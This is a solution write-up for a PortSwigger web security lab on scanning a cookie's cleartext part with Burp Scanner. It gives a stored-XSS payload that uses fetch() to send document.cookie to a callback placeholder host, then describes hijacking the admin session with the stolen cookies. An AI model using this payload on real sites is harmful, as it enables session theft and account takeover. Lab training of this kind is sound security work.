# Lab 02 — Scanning non-standard data structures

> **Practitioner** · [Official lab](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures)

**Entry point:** the session cookie is `wiener:<session-id>` — scan the
**first part** (a non-standard data structure) for stored issues.

## Solution

1. Log in; study the cookie (cleartext username : session id).
2. In Burp, select just the cleartext part → **Scan selected insertion
   point** (see note for Community).
3. Scanner reports **Stored XSS** (detected via Collaborator interaction).
4. In Repeater, decode the cookie, replace the scanner's proof-of-concept
   with a cookie-exfiltrating payload, preserving the session-id part:

```
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```

5. After ~a minute, Collaborator receives the **admin's cookies** — set them
   in your browser, open the admin panel, delete carlos — lab solved.

> **Burp Community alternative (free):** Collaborator is Pro-only — use
> [interact.sh](https://interact.sh)/[canarytokens.org](https://canarytokens.org)
> as the callback domain, and find the stored XSS manually by fuzzing the
> cookie value with common breakout payloads.
